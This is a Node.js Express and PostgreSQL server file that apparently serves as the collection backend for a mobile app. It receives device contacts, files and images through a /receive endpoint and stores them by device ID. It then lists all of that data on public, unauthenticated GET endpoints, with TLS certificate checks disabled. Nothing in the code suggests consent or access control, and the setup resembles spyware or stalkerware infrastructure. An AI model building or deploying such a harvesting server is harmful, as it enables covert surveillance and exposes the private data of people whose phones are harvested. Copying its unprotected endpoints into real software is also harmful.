const express = require("express");
const bodyParser = require("body-parser");
const { Pool } = require("pg");

const app = express();
app.use(bodyParser.json({ limit: "50mb" }));

// PostgreSQL connection (Render ENV)
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// Create tables
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS contacts (
        id SERIAL PRIMARY KEY,
        device_id TEXT,
        contact_data TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS files (
        id SERIAL PRIMARY KEY,
        device_id TEXT,
        file_data TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS images (
        id SERIAL PRIMARY KEY,
        device_id TEXT,
        image_data TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    console.log("Tables created successfully");
  } catch (err) {
    console.error("Error creating tables:", err);
  }
}

initDB();


// ================== RECEIVE DATA FROM APP ==================
app.post("/receive", async (req, res) => {
  try {
    const { type, device_id, data } = req.body;

    if (type === "contacts") {
      await pool.query(
        "INSERT INTO contacts (device_id, contact_data) VALUES ($1, $2)",
        [device_id, JSON.stringify(data)]
      );
    }

    if (type === "files") {
      await pool.query(
        "INSERT INTO files (device_id, file_data) VALUES ($1, $2)",
        [device_id, JSON.stringify(data)]
      );
    }

    if (type === "images") {
      await pool.query(
        "INSERT INTO images (device_id, image_data) VALUES ($1, $2)",
        [device_id, data]
      );
    }

    res.send("Data saved successfully");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error saving data");
  }
});


// ================== VIEW DATA APIs ==================

// View contacts
app.get("/contacts", async (req, res) => {
  try {
    const result = await pool.query("SELECT * FROM contacts ORDER BY id DESC");
    res.json(result.rows);
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// View files
app.get("/files", async (req, res) => {
  try {
    const result = await pool.query("SELECT * FROM files ORDER BY id DESC");
    res.json(result.rows);
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// View images
app.get("/images", async (req, res) => {
  try {
    const result = await pool.query("SELECT * FROM images ORDER BY id DESC");
    res.json(result.rows);
  } catch (err) {
    res.status(500).send(err.message);
  }
});


// ================== SIMPLE HOME PAGE ==================
app.get("/", (req, res) => {
  res.send(`
    <h1>Backend Running ✅</h1>
    <h3>View Data:</h3>
    <ul>
      <li><a href="/contacts">Contacts</a></li>
      <li><a href="/files">Files</a></li>
      <li><a href="/images">Images</a></li>
    </ul>
  `);
});


// ================== START SERVER ==================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
